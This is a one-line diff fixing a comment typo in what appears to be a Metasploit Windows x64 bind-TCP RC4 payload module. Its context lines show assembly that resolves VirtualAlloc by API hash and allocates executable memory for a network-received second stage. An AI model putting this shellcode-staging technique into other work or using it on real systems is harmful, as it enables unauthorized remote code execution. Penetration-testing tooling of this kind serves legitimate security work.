@@ -84,7 +84,7 @@ module Payload::Windows::BindTcpRc4_x64
         pop r9                  ; PAGE_EXECUTE_READWRITE
         push 0x1000             ;
         pop r8                  ; MEM_COMMIT
-        mov rdx, rsi            ; the newly recieved second stage length.
+        mov rdx, rsi            ; the newly received second stage length.
         xor rcx,rcx             ; NULL as we dont care where the allocation is.
         mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call rbp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
